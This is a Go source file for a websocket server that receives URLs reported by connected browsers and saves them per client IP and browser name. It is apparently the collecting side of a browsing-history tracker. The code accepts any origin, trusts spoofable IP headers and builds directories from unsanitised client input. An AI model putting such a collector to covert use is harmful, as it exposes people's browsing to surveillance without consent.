package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/gorilla/websocket"
)

type clientInfo struct {
	IP          string
	BrowserName string
}

type Server struct {
	clients     map[*websocket.Conn]*clientInfo
	clientsMtx  sync.Mutex
	upgrader    websocket.Upgrader
	dirReplacer *strings.Replacer
}

// NewServer initializes a new Server instance.
func NewServer() *Server {
	return &Server{
		clients: make(map[*websocket.Conn]*clientInfo),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},
		dirReplacer: strings.NewReplacer(":", ";", ".", ";"),
	}
}

func (s *Server) Run(addr string) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/ws", s.handleConnections)

	srv := &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	go func() {
		log.Printf("Server listening on %s", addr)
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("ListenAndServe error: %v", err)
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, os.Interrupt, syscall.SIGTERM)
	<-quit
	log.Println("Shutting down server...")

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	return srv.Shutdown(ctx)
}

func (s *Server) handleConnections(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Error upgrading connection: %v", err)
		return
	}
	defer func() {
		conn.Close()
		s.clientsMtx.Lock()
		delete(s.clients, conn)
		s.clientsMtx.Unlock()
	}()

	clientIP := getClientIP(r)
	client := &clientInfo{
		IP:          clientIP,
		BrowserName: "Unknown",
	}

	s.clientsMtx.Lock()
	s.clients[conn] = client
	s.clientsMtx.Unlock()

	color.New(color.FgHiBlack).Printf("Connected: IP=%s\n", clientIP)

	userDirectory := s.formatDirectory(fmt.Sprintf("%s@%s", client.BrowserName, clientIP))
	if err := os.MkdirAll(userDirectory, os.ModePerm); err != nil {
		log.Printf("Error creating directory %s: %v", userDirectory, err)
	}

	for {
		messageType, payload, err := conn.ReadMessage()
		if err != nil {
			color.New(color.FgHiBlack).Printf("Connection closed: IP=%s\n", clientIP)
			return
		}

		if messageType == websocket.TextMessage {
			message := string(payload)
			switch {
			case strings.HasPrefix(message, "BrowserConnected|"):
				newBrowserName := strings.TrimPrefix(message, "BrowserConnected|")
				s.clientsMtx.Lock()
				client.BrowserName = newBrowserName
				s.clientsMtx.Unlock()

				newUserDirectory := s.formatDirectory(fmt.Sprintf("%s@%s", client.BrowserName, clientIP))
				if err := os.Rename(userDirectory, newUserDirectory); err != nil {
					log.Printf("Error renaming directory from %s to %s: %v", userDirectory, newUserDirectory, err)
				} else {
					userDirectory = newUserDirectory
				}

			case strings.HasPrefix(message, "VisitedURL:"):
				visitedURL := strings.TrimPrefix(message, "VisitedURL:")
				color.New(color.FgCyan).Printf("[%s@%s] %s\n", client.BrowserName, clientIP, visitedURL)
				saveURLToFile(userDirectory, visitedURL)
			}
		}
	}
}

func getClientIP(r *http.Request) string {
	ip := r.Header.Get("X-Real-IP")
	if ip == "" {
		ip = r.Header.Get("X-Forwarded-For")
	}
	if ip == "" {
		ip, _, _ = net.SplitHostPort(r.RemoteAddr)
	}
	return ip
}

func (s *Server) formatDirectory(directoryName string) string {
	return s.dirReplacer.Replace(directoryName)
}

func saveURLToFile(directory, url string) {
	filePath := fmt.Sprintf("%s/visited_urls.txt", directory)
	file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		log.Printf("Error opening file %s: %v", filePath, err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(url + "\n"); err != nil {
		log.Printf("Error writing to file %s: %v", filePath, err)
	}
}

func main() {
	server := NewServer()
	if err := server.Run(":8081"); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}
